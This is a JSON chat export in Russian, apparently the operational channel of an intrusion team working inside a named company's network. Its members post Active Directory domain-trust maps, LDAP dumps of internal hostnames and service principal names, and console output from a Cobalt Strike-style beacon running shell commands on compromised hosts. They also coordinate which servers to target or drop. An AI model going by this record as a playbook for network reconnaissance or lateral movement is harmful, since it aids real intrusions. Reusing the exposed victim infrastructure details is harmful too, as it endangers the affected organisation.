+      "channels": []
+    },
+    {
+      "_id": "KxpYojyfybnCFccaN",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "которые в АД",
+      "ts": "2020-10-07T23:11:50.839Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T23:11:55.419Z",
+      "mentions": [],
+      "channels": [],
+      "editedAt": "2020-10-07T23:11:55.417Z",
+      "editedBy": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8"
+      },
+      "urls": []
+    },
+    {
+      "_id": "mF2MDDs3AcNMhPmXN",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "вот в этом saiglobal.com \nу него в трастах было 2 датацентра",
+      "ts": "2020-10-07T23:11:42.808Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T23:11:42.838Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "8ZDGxuofQjMnGQ54C",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "[ ](https://mediaeveryone.com/group/saiglobal-com?msg=t7mimJ5JXQBP2Qbrf) подпиши плиз из какого домена",
+      "ts": "2020-10-07T23:11:27.878Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T23:11:27.926Z",
+      "attachments": [
+        {
+          "text": "```\n    0: 80-20 80-20.com (Direct Outbound) (Direct Inbound)\n    1: LEGALCO legalco.local (Direct Outbound) (Direct Inbound)\n    2: FRD frd.global (Forest tree root) (Direct Outbound) (Direct Inbound)\n    3: ANSTAT Anstat.local (Direct Outbound) (Direct Inbound)\n    4: LEADERS leaders.frd.global\n    5: AUST standards.com.au (Direct Outbound) (Direct Inbound)\n    6: SAIGPROD SaigProd.local (Direct Outbound) (Direct Inbound)\n    7: C360 c360.local (Direct Outbound) (Direct Inbound)\n    8: DATACENTER datacenter.local (Direct Outbound) (Direct Inbound)\n    9: C360UK c360uk.local (Direct Outbound) (Direct Inbound)\n    10: SAIG saig.frd.global (Forest 2) (Primary Domain) (Native)\n```",
+          "author_name": "user7",
+          "author_icon": "/avatar/user7",
+          "message_link": "https://mediaeveryone.com/group/saiglobal-com?msg=t7mimJ5JXQBP2Qbrf",
+          "attachments": [],
+          "ts": "2020-10-07T23:11:12.964Z"
+        }
+      ],
+      "urls": [
+        {
+          "url": "https://mediaeveryone.com/group/saiglobal-com?msg=t7mimJ5JXQBP2Qbrf",
+          "ignoreParse": true
+        }
+      ],
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "LNnq7tux3ZYza35eN",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "значит один домен видит часть трастов из общего списка который не видит другие",
+      "ts": "2020-10-07T23:11:15.953Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T23:11:15.989Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "t7mimJ5JXQBP2Qbrf",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "```\n    0: 80-20 80-20.com (Direct Outbound) (Direct Inbound)\n    1: LEGALCO legalco.local (Direct Outbound) (Direct Inbound)\n    2: FRD frd.global (Forest tree root) (Direct Outbound) (Direct Inbound)\n    3: ANSTAT Anstat.local (Direct Outbound) (Direct Inbound)\n    4: LEADERS leaders.frd.global\n    5: AUST standards.com.au (Direct Outbound) (Direct Inbound)\n    6: SAIGPROD SaigProd.local (Direct Outbound) (Direct Inbound)\n    7: C360 c360.local (Direct Outbound) (Direct Inbound)\n    8: DATACENTER datacenter.local (Direct Outbound) (Direct Inbound)\n    9: C360UK c360uk.local (Direct Outbound) (Direct Inbound)\n    10: SAIG saig.frd.global (Forest 2) (Primary Domain) (Native)\n```",
+      "ts": "2020-10-07T23:11:12.964Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-10-07T23:11:13.080Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "2ZYk8xKJrdszg3WR9",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "они не 1 в 1",
+      "ts": "2020-10-07T23:11:04.861Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T23:11:04.904Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "zkcbiT5rHBgui4HG5",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "между разными доменами где сессии висят",
+      "ts": "2020-10-07T23:11:00.764Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T23:11:00.792Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "XQTJnvieDHkbN8TSy",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "сравни просто net domain_trusts",
+      "ts": "2020-10-07T23:10:54.274Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T23:10:54.309Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "vBMJ3M48D6KXxoBHf",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "айпишник один и тот же",
+      "ts": "2020-10-07T23:10:42.577Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T23:10:42.600Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "nPxjjKqXWWD6XbQ9o",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "1 из в карантине",
+      "ts": "2020-10-07T23:10:38.320Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T23:10:38.359Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "9YLn9SeFmBk9xkv9Y",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "там в трастах 2 датацентра точно",
+      "ts": "2020-10-07T23:10:32.832Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T23:10:32.862Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ETtXRiS4HJcwDHDfZ",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "не понял",
+      "ts": "2020-10-07T23:10:26.838Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T23:10:26.869Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "secS6xXtdgC5GzXd7",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "я как минимум замечал разные между frd.global и saig...., datacenter...",
+      "ts": "2020-10-07T23:09:52.340Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T23:09:52.378Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "DM6d6Djry9RpfeigL",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "в трасты потом все равно лезть придется",
+      "ts": "2020-10-07T23:09:33.741Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T23:09:33.778Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "5PK4Afyerx6AcPean",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "ок пока доделывай остальное по домену",
+      "ts": "2020-10-07T23:09:27.023Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T23:09:27.052Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "9FcY3epQ9ZBBNxJhz",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "-",
+      "ts": "2020-10-07T23:08:56.419Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T23:08:56.450Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Jx73kpydoTP8WyuBb",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "[ ](https://mediaeveryone.com/group/saiglobal-com?msg=BxbusgHiy84BsvA2G) трасты",
+      "ts": "2020-10-07T23:08:47.691Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T23:08:47.719Z",
+      "attachments": [
+        {
+          "text": "новыми в плане прям новыми или трастами от этого?",
+          "author_name": "user8",
+          "author_icon": "/avatar/user8",
+          "message_link": "https://mediaeveryone.com/group/saiglobal-com?msg=BxbusgHiy84BsvA2G",
+          "attachments": [],
+          "ts": "2020-10-07T23:08:35.196Z"
+        }
+      ],
+      "urls": [
+        {
+          "url": "https://mediaeveryone.com/group/saiglobal-com?msg=BxbusgHiy84BsvA2G",
+          "ignoreParse": true
+        }
+      ],
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "BxbusgHiy84BsvA2G",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "новыми в плане прям новыми или трастами от этого?",
+      "ts": "2020-10-07T23:08:35.196Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T23:08:35.231Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "4RswSScAPgQWNrsv2",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "10 - 0% лосс",
+      "ts": "2020-10-07T23:08:25.693Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T23:08:25.735Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Wbdjq9tEcQoedRsAo",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "```\nWeb Server - 25\n``` \nа есть другие сервера этой категории которые отвечают на пинг корректно ?",
+      "ts": "2020-10-07T23:07:39.779Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-07T23:07:39.826Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "JbLumDyzXk8HyCSH2",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "ты так и не занимался новыми доменами?",
+      "ts": "2020-10-07T23:06:35.267Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T23:06:35.300Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "uzndjLxhCm44E2vjE",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "к",
+      "ts": "2020-10-07T23:06:21.460Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T23:06:21.491Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "QevZ66rDg9oyffhZ2",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "репинг завтра сделать можно будет или еще поискать варианты",
+      "ts": "2020-10-07T23:06:15.752Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T23:06:15.793Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "xwAnF7FbNxYueDz6K",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "кинь пока в 100% loss",
+      "ts": "2020-10-07T23:06:02.251Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T23:06:02.280Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "L4ex2SiT5AbN9zXRn",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "в датацентре",
+      "ts": "2020-10-07T23:05:53.613Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T23:05:53.650Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "yJ6NK7Ny2vFuWSBxz",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "с дк",
+      "ts": "2020-10-07T23:05:50.017Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T23:05:50.043Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "EYKHT7Hi8ZFktz6Hi",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "а ты откуда пингуешь кст?",
+      "ts": "2020-10-07T23:05:45.911Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T23:05:46.078Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "S2xxxHsbbkW3oMCPi",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "=> рдс и ссо в дизейбл, веб оставляю?",
+      "ts": "2020-10-07T23:05:24.504Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T23:05:24.535Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "L32t3cB4yeBBZyK5c",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "к тому же это в 1 домене",
+      "ts": "2020-10-07T23:04:53.783Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T23:04:53.823Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "hPnLe93wjiQKTCHjK",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "веб не особо критичные я думаю",
+      "ts": "2020-10-07T23:04:49.403Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T23:04:49.442Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "YQp9bTLto5SKmuqpB",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "100% лосс",
+      "ts": "2020-10-07T23:04:28.394Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T23:04:28.418Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "CiQhafLgfArYZFzuK",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "штук",
+      "ts": "2020-10-07T23:04:24.883Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T23:04:24.916Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Z5HKnpCPjuFXjxeJ8",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "RDS - 2\nWeb Server - 25\nSSO - 1",
+      "ts": "2020-10-07T23:04:21.013Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T23:04:21.042Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "65KAK9iJjXjAXLaBv",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "категории",
+      "ts": "2020-10-07T22:58:22.487Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-07T22:58:22.515Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "RAHYFywd3BeJ8KCnf",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "назначение",
+      "ts": "2020-10-07T22:58:20.725Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-07T22:58:20.751Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "MaXxLMEdHYEiHGdx2",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "?",
+      "ts": "2020-10-07T22:58:13.220Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T22:58:13.259Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "w7qLCZajoRtw8ySeR",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "что подразумевается под \"критичные\"",
+      "ts": "2020-10-07T22:58:12.265Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T22:58:12.297Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "PNHLiLHSBrGFey4Pd",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "28",
+      "ts": "2020-10-07T22:58:00.663Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T22:58:00.690Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "YspC2kbrqfp2zgHY2",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "критичные?",
+      "ts": "2020-10-07T22:57:24.761Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-07T22:57:24.787Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "4f2Ju6SqC8bdfu5h2",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "много таких?",
+      "ts": "2020-10-07T22:57:22.932Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-07T22:57:22.960Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Hj4kSonLqtG83kAKy",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "серваки с 100% loss тоже в Disabled?",
+      "ts": "2020-10-07T22:53:31.504Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T22:53:31.552Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "DREmwKXZPZ7ZqJb7j",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "прально)",
+      "ts": "2020-10-07T21:50:09.430Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-07T21:50:09.484Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "w33WoNADhdTYkJeMC",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "и теперь пинговать все, чтобы узнать какие ещё отрублены :sunglasses:",
+      "ts": "2020-10-07T21:46:17.860Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T21:46:17.898Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "XmtwrKywam6R8qcA8",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "ага",
+      "ts": "2020-10-07T21:45:41.891Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-07T21:45:41.932Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "7LvApuvKHeYgCuEFJ",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "в Disabled Servers закину тогда?",
+      "ts": "2020-10-07T21:44:01.441Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T21:44:01.468Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ZD2vvKP4DSquy5apm",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "```\nbeacon> shell ping USHDC1-CSPSPH01.datacenter.local\n[*] Tasked beacon to run: ping USHDC1-CSPSPH01.datacenter.local\n[+] host called home, sent: 68 bytes\n[+] received output:\nPing request could not find host USHDC1-CSPSPH01.datacenter.local. Please check the name and try again.\n\nbeacon> shell ping USHDC1-CSPSPH02.datacenter.local\n[*] Tasked beacon to run: ping USHDC1-CSPSPH02.datacenter.local\n[+] host called home, sent: 68 bytes\n[+] received output:\nPing request could not find host USHDC1-CSPSPH02.datacenter.local. Please check the name and try again.\n``` \nЭто вот эти последние",
+      "ts": "2020-10-07T21:43:53.064Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T21:43:53.224Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "CoebYixkLKsad6cyL",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "OU=C360 - SSO сервера с разными сервисами аутлучными я полагаю\nOU=SCCM - SCCM серваки\nпоследний не знаю...",
+      "ts": "2020-10-07T21:40:26.361Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-07T21:40:26.390Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "RSBCH8beGffYr5YAx",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "```\nCN=USHDC1-CSPFPS03,OU=Production,OU=C360,OU=Servers,OU=0.SAI Global,DC=datacenter,DC=local\n\n>dNSHostName: USHDC1-CSPFPS03.datacenter.local\n>servicePrincipalName: CmRcService/USHDC1-CSPFPS03\n>servicePrincipalName: CmRcService/USHDC1-CSPFPS03.datacenter.local\n>servicePrincipalName: WSMAN/USHDC1-CSPFPS03\n>servicePrincipalName: WSMAN/USHDC1-CSPFPS03.datacenter.local\n>servicePrincipalName: TERMSRV/USHDC1-CSPFPS03\n>servicePrincipalName: TERMSRV/USHDC1-CSPFPS03.datacenter.local\n>servicePrincipalName: RestrictedKrbHost/USHDC1-CSPFPS03\n>servicePrincipalName: HOST/USHDC1-CSPFPS03\n>servicePrincipalName: RestrictedKrbHost/USHDC1-CSPFPS03.datacenter.local\n>servicePrincipalName: HOST/USHDC1-CSPFPS03.datacenter.local\n``` \n```\nCN=USHDC1-CSPMGW02,OU=Production,OU=C360,OU=Servers,OU=0.SAI Global,DC=datacenter,DC=local\n\n>dNSHostName: USHDC1-CSPMGW02.datacenter.local\n>servicePrincipalName: WSMAN/USHDC1-CSPMGW02.datacenter.local\n>servicePrincipalName: WSMAN/USHDC1-CSPMGW02\n>servicePrincipalName: CmRcService/USHDC1-CSPMGW02.datacenter.local\n>servicePrincipalName: CmRcService/USHDC1-CSPMGW02\n>servicePrincipalName: TERMSRV/USHDC1-CSPMGW02.datacenter.local\n>servicePrincipalName: TERMSRV/USHDC1-CSPMGW02\n>servicePrincipalName: RestrictedKrbHost/USHDC1-CSPMGW02\n>servicePrincipalName: HOST/USHDC1-CSPMGW02\n>servicePrincipalName: RestrictedKrbHost/USHDC1-CSPMGW02.datacenter.local\n>servicePrincipalName: HOST/USHDC1-CSPMGW02.datacenter.local\n``` \n\n```\nCN=USHDC1-CSPAPP23,OU=Production,OU=C360,OU=Servers,OU=0.SAI Global,DC=datacenter,DC=local\n\n>dNSHostName: USHDC1-CSPAPP23.datacenter.local\n>servicePrincipalName: CmRcService/USHDC1-CSPAPP23\n>servicePrincipalName: CmRcService/USHDC1-CSPAPP23.datacenter.local\n>servicePrincipalName: WSMAN/USHDC1-CSPAPP23\n>servicePrincipalName: WSMAN/USHDC1-CSPAPP23.datacenter.local\n>servicePrincipalName: TERMSRV/USHDC1-CSPAPP23\n>servicePrincipalName: TERMSRV/USHDC1-CSPAPP23.datacenter.local\n>servicePrincipalName: RestrictedKrbHost/USHDC1-CSPAPP23\n>servicePrincipalName: HOST/USHDC1-CSPAPP23\n>servicePrincipalName: RestrictedKrbHost/USHDC1-CSPAPP23.datacenter.local\n>servicePrincipalName: HOST/USHDC1-CSPAPP23.datacenter.local\n``` \n\n```\nCN=USHDC1-COPSCM02,OU=SCCM,OU=Corporate IT,OU=Servers,OU=0.SAI Global,DC=datacenter,DC=local\n\n>dNSHostName: USHDC1-COPSCM02.datacenter.local\n>servicePrincipalName: CmRcService/USHDC1-COPSCM02.datacenter.local\n>servicePrincipalName: CmRcService/USHDC1-COPSCM02\n>servicePrincipalName: WSMAN/USHDC1-COPSCM02.datacenter.local\n>servicePrincipalName: WSMAN/USHDC1-COPSCM02\n>servicePrincipalName: TERMSRV/USHDC1-COPSCM02.datacenter.local\n>servicePrincipalName: TERMSRV/USHDC1-COPSCM02\n>servicePrincipalName: RestrictedKrbHost/USHDC1-COPSCM02\n>servicePrincipalName: HOST/USHDC1-COPSCM02\n>servicePrincipalName: RestrictedKrbHost/USHDC1-COPSCM02.datacenter.local\n>servicePrincipalName: HOST/USHDC1-COPSCM02.datacenter.local\n``` \n\n```\nCN=USHDC1-CSPSPH02,OU=Production,OU=DM360,OU=Servers,OU=0.SAI Global,DC=datacenter,DC=local\n\n>dNSHostName: USHDC1-CSPSPH02.datacenter.local\n>servicePrincipalName: CmRcService/USHDC1-CSPSPH02.datacenter.local\n>servicePrincipalName: CmRcService/USHDC1-CSPSPH02\n>servicePrincipalName: WSMAN/USHDC1-CSPSPH02.datacenter.local\n>servicePrincipalName: WSMAN/USHDC1-CSPSPH02\n>servicePrincipalName: TERMSRV/USHDC1-CSPSPH02\n>servicePrincipalName: TERMSRV/USHDC1-CSPSPH02.datacenter.local\n>servicePrincipalName: RestrictedKrbHost/USHDC1-CSPSPH02\n>servicePrincipalName: HOST/USHDC1-CSPSPH02\n>servicePrincipalName: RestrictedKrbHost/USHDC1-CSPSPH02.datacenter.local\n>servicePrincipalName: HOST/USHDC1-CSPSPH02.datacenter.local\n```",
+      "ts": "2020-10-07T21:37:53.002Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T21:39:02.148Z",
+      "mentions": [],
+      "channels": [],
+      "editedAt": "2020-10-07T21:39:02.145Z",
+      "editedBy": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8"
+      },
+      "urls": []
+    },
+    {
+      "_id": "D9QPCtMBHtYZcPMEE",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "все*",
+      "ts": "2020-10-07T21:35:32.353Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T21:35:32.387Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "KmQGqLRFiEtyXe9yN",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "ts": "2020-10-07T21:35:30.065Z",
+      "msg": "",
+      "file": {
+        "_id": "g4JWsKYGLrY9qxMLx",
+        "name": "Clipboard - 8 октября 2020 г., 00:35",
+        "type": "image/png"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "Clipboard - 8 октября 2020 г., 00:35",
+          "title_link": "/file-upload/g4JWsKYGLrY9qxMLx/Clipboard%20-%208%20%D0%BE%D0%BA%D1%82%D1%8F%D0%B1%D1%80%D1%8F%202020%20%D0%B3.,%2000:35",
+          "title_link_download": true,
+          "image_dimensions": {
+            "width": 960,
+            "height": 1055
+          },
